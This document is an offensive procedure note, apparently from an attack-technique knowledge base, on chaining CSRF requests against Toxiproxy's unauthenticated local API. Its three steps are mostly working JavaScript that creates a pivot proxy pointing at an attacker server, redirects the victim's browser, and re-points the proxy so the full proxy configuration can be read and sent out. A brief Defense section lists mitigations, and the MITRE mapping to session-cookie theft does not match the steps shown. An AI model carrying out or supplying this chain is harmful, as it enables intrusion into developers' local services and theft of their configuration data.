---
tags:
  - sop-bypass
  - state-exfiltration
  - xhr
type: procedure
tools:
  - '[[tools/fetch-API]]'
  - '[[tools/toxiproxy]]'
tactics:
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 35ca98c3-30cc-43de-a7d9-824571687ee5
created_at: '2025-12-14T17:27:29.714Z'
updated_at: '2025-12-14T17:27:29.715Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Bypass-SOP-to-Read-Toxiproxy-State

## Summary

This procedure chains multiple CSRF requests to create a 'pivot' proxy, redirect the victim's browser to it, update its upstream to the Toxiproxy API, and then read the full proxy state via same-origin XHR, bypassing Same-Origin Policy restrictions.

## Description

By controlling proxy upstreams via CSRF, the attacker makes the localhost:8474 API appear same-origin after redirection. This allows exfiltration of sensitive configuration data. It requires JavaScript execution in the victim's browser and exploits Toxiproxy's lack of origin validation.

## Requirements

1. Victim browser supporting redirects and XHR
2. Running Toxiproxy with CSRF-created proxies
3. Attacker server on port 7486

## Defense

Defensive measures and detection strategies:

- Enforce strict origin policies in local APIs
- Disable or sandbox local proxy tools in browsers
- Monitor for rapid proxy configuration changes via API logs

## Objectives

1. Make Toxiproxy API same-origin to malicious page
2. Exfiltrate all proxy configurations
3. Enable further data collection

## Instructions

### Step 1: Create Pivot Proxy

**Context**: CSRF POST to create a proxy listening on 7486 pointing to attacker.

**Command** (via [[tools/fetch-API]]):
```javascript
fetch('http://localhost:8474/proxies', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({name: 'pivot', listen: '127.0.0.1:7486', upstream: 'attacker-server:7486', enabled: true})
});
```

> Creates the pivot proxy.

### Step 2: Redirect and Update

**Context**: Redirect to pivot URL, then CSRF update upstream to localhost:8474.

**Command** (JavaScript):
```javascript
window.location.href = 'http://127.0.0.1:7486/';
// After redirect, CSRF update
fetch('http://localhost:8474/proxies/pivot', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({upstream: {url: 'localhost:8474'}})
});
```

> Now requests to 7486 proxy to localhost:8474.

### Step 3: Read State

**Context**: Use XHR to GET /proxies, now same-origin.

**Command** (via [[tools/fetch-API]]):
```javascript
fetch('http://127.0.0.1:7486/proxies')
  .then(response => response.json())
  .then(data => console.log(data)); // Or send to attacker
```

> Expected output: Array of all proxy objects.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/fetch-API]]
- [[tools/toxiproxy]]

## Tags

- sop-bypass
- state-exfiltration
- xhr
